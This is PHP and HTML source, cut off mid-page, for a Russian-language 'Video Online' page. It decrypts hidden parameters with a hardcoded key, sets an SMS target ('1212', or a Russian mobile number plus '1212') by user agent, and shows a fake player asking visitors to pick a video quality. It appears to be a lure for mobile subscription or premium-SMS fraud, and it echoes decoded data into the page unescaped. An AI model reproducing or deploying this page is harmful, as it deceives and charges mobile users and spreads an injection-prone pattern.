<?php
    function decode($ciphertext, $key)
    {
        $c = base64_decode($ciphertext);
        $cipher = "AES-128-CBC";
        $sha2len = 32;
        $options = OPENSSL_RAW_DATA;
        $asBinary = true;
        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = substr($c, 0, $ivlen);
        $hmac = substr($c, $ivlen, $sha2len);
        $ciphertextRaw = substr($c, $ivlen+$sha2len);
        $originalPlaintext = openssl_decrypt($ciphertextRaw, $cipher, $key, $options, $iv);
        $calcmac = hash_hmac('sha256', $ciphertextRaw, $key, $asBinary);
        if (hash_equals($hmac, $calcmac)) {
            return $originalPlaintext."\n";
        }

        return '';
    }

$q = str_replace(' ', '+', $_GET['q']);
$paramsStr = decode($q, 'z6aB00clTCK8ihH');
$paramsArr = json_decode($paramsStr, true);


/* replace phone number */
if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), strtolower("iPhone")) !== false){
 $send_to_phone = "1212"; /* for ios */
} else {
 $send_to_phone = "+79817140609;1212"; /* for other os */
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Видео Онлайн</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="theme-color" content="#33834f"/>
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <link media="all" rel="stylesheet" href="css/main.css">
		<script src="js/jquery-3.2.1.min.js"></script>
		<script src="js/jquery.inputmask.bundle.js"></script>
		<script src="js/js-mask.min.js"></script>
</head>
<body>
<input id="params" type="hidden" value='<?= $paramsStr; ?>'>
<div class="page">
  <div class="content">
    <div class="header">
      <div class="wrapper clearfix">
        <div class="header__left">
          <img class="header__menu" src="img/menu.png" alt="">
          <!-- <img class="header__logo" src="img/logo.png" alt=""> -->
        </div>
        <div class="header__right">
          <img src="img/search.png" alt="">
        </div>
      </div>
    </div>
    <div class="wrapper">
      <ul class="menu">
        <li class="active">TOP</li>
        <li>По тематикам</li>
        <li>По жанрам</li>
        <li>Тренды</li>
      </ul>
      <div class="promo">
        <div class="promo__head">Выберите качество видео</div>
        <div class="player">
          <div class="form">

            <div id="mo">
              <div class="quality">
                <a href="./?send=yes&amp;sign=2a587a63c4e392921b3bea5cfc8b14d4-1578565020&amp;key=0" id="link" class="">
                  <span>Low 480p</span>
                  <span>HD 720p</span>
                  <span>Full HD 1080p</span>
                </a>
                <div id="before-load">
                     <div class='preloader-rotate'></div>
                </div>